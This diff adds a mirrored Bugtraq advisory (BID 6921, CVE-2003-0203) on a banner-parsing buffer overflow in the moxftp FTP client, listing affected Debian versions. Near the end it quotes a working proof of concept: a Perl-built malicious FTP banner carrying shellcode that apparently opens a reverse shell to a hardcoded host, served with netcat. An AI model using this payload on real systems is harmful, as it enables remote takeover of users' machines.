@@ -1,0 +1,221 @@
+#SpeeDr00t@Black Falcon<br>#bid6921<p><b><span style="font-size: 18pt;">moxftp Banner Parsing Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/6921/info">info</a><br><a href="http://www.securityfocus.com/bid/6921/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/6921/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/6921/solution">solution</a><br><a href="http://www.securityfocus.com/bid/6921/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				6921
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2003-0203<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 24 2003 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 11 2009 08:06PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability credited to Knud Erik HÃ¸jgaard.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					xftp xftp 2.2 <br/>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  s/390<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  ppc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  mipsel<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  mips<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  m68k<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  ia-64<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  ia-32<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  hppa<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  arm<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0  alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 3.0 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  sparc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  powerpc<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  IA-32<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  arm<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  alpha<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2  68k<br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						moxftp moxftp 2.2 <br/>
+</span>
+					
+				
+					moxftp moxftp 2.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>#<a href="https://github.com/SpeeDr00t/speedr00t.github.com/blob/master/securityfocus/0x7000/6921/DSR-ftp_clients.pl">#exploit_DSR-ftp_clients.pl</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following proof of concept was provided:<br/><br/>$ perl -e 'print "220 " . "\x90" x 508 . "\x48\xfa\xbf\xbf" x 2 . "\x90" x 100 .  "\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80\x89\xc3\x68\xd9\ x9d\x02\x24\x66\x68\x27\x10\x66\x51\x89\xe6\xb2\x10\x52\x56\x50\x50\xb0\x62\ xcd\x80\x41\xb0\x5a\x49\x51\x53\x53\xcd\x80\x41\xe2\xf5\x51\x68\x2f\x2f\x73\ x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x54\x53\x53\xb0\x3b\xcd\x80" . <br/>"\n"' &amp;gt; file<br/># nc -l -p 21 &amp;lt; file<br/><br/>The following exploit is available:
+	
+		<ul>
+<li><a href="/data/vulnerabilities/exploits/DSR-ftp_clients.pl">/data/vulnerabilities/exploits/DSR-ftp_clients.pl</a></li>
+</ul>
+</div>
